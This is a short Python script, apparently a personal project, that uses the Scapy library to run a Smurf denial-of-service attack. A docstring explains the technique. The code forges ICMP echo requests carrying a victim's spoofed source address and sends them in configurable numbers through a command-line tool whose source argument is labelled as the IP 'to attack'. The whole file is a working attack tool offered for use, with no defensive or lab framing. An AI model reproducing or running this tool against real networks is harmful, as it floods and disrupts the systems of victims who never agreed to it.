"""
Author : Ilay Gilman

Date : 07/07/2020

Background : The Smurf attack is a distributed denial-of-service attack in which large numbers of Internet Control
 Message Protocol (ICMP) packets with the intended victim's spoofed source IP are broadcast to a computer network using
  an IP broadcast address. Most devices on a network will, by default, respond to this by sending a reply to the source
   IP address. If the number of machines on the network that receive and respond to these packets is very large, the
    victim's computer will be flooded with traffic. This can slow down the victim's computer to the point where it
     becomes impossible to work on.
"""
try:
    from scapy.all import *
    from scapy.layers.inet import *
    import argparse
except Exception as e:
    print(e)
    exit()


def smurf_them_up(src_ip, dst_ip, count=1000, length=32, data=None):
    if data:
        smurf_packet = IP(version=4, tos=0, ttl=128, id=1, src=src_ip, dst=dst_ip) / ICMP(type=8, code=0, id=1, seq=1) \
                       / Raw(data)
    else:
        smurf_packet = IP(version=4, tos=0, ttl=128, id=1, src=src_ip, dst=dst_ip) / ICMP(type=8, code=0, id=1, seq=1) \
                       / Raw("a"*length)
    for number in range(count):
        send(smurf_packet)
        smurf_packet[ICMP].seq += 1


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--src", help="choose valid ip address to attack", type=str, required=True,
                        metavar="Source")
    parser.add_argument("-d", "--dst", help="choose valid,alive ip address to supply the echo-responses", type=str,
                        required=True, metavar="Destination")
    parser.add_argument("-c", "--count", help="specify how much ping requests to send[def=1000]", type=int,
                        metavar="Count")
    parser.add_argument("-l", "--length", help="specify which size the packet will be[def=74 when length is 32]",
                        type=int, metavar="Length")
    parser.add_argument("-r", "--raw", help="specify raw data to send over the ping", type=str,
                        metavar="Raw")
    args = parser.parse_args()
    smurf_them_up(args.src, args.dst, args.count, args.length, args.raw)


if __name__ == '__main__':
    main()
